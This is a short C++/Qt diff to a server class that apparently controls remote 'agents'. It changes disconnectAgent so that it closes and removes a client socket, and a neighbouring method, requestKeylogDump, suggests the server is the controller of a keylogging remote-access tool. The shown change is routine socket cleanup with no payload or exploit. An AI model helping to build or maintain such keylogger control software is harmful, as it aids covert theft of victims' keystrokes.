@@ -274,15 +274,17 @@ void Server::requestKeylogDump(const QString& ip) {
 }
 
 void Server::disconnectAgent(const QString& ip) {
-    for (auto& client : m_clients) {
-        if (QString::fromStdString(client.socket.getIp()) == ip) {
-            if (client.socket.isValid()) {
+    for (auto it = m_clients.begin(); it != m_clients.end(); ++it) {
+        if (QString::fromStdString(it->socket.getIp()) == ip) {
+            if (it->socket.isValid()) {
 #ifdef _WIN32
-                ::shutdown(client.socket.getFd(), SD_BOTH);
+                ::shutdown(it->socket.getFd(), SD_BOTH);
 #else
-                ::shutdown(client.socket.getFd(), SHUT_RDWR);
+                ::shutdown(it->socket.getFd(), SHUT_RDWR);
 #endif
+                it->socket.close();
             }
+            m_clients.erase(it);
             break;
         }
     }
